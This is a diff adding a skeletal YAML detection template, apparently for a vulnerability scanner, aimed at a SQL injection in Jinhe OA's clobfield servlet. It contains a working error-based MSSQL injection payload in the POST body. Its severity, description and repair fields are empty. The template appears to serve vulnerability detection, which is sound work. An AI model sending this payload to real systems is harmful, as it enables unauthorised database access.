@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 金和OA jc6 clobfield SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /jc6/servlet/clobfield
+  headers:
+  data: |
+    key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11'/**/and/**/CONVERT(int,@@version)=1/**/and/**/''='
+response1:
+  body: SQL
+  code: 200
+requests2:
+response2:
